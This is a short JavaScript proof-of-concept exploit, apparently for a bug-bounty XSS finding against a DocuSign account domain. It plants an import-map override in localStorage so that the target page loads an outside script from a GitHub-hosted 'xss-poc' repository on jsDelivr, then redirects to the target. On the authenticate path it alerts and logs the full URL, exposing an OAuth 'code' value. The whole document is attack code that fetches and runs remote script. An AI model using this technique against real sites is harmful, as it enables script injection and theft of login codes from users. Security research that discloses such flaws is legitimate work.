const searchParams = new URLSearchParams(location.search);

if(searchParams.has('code') && location.path ==='/authenticate') {
  alert(location.href);
  console.log(location.href);
} else if(localStorage.getItem('import-map-overrides-external-maps') === null) {
  localStorage.setItem(
    'import-map-overrides-external-maps',
    JSON.stringify([
      {
        imports: {
          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docus.js"
        },
      },
    ])
  );
  location.href = 'https://account-d.docusign.com/'
}
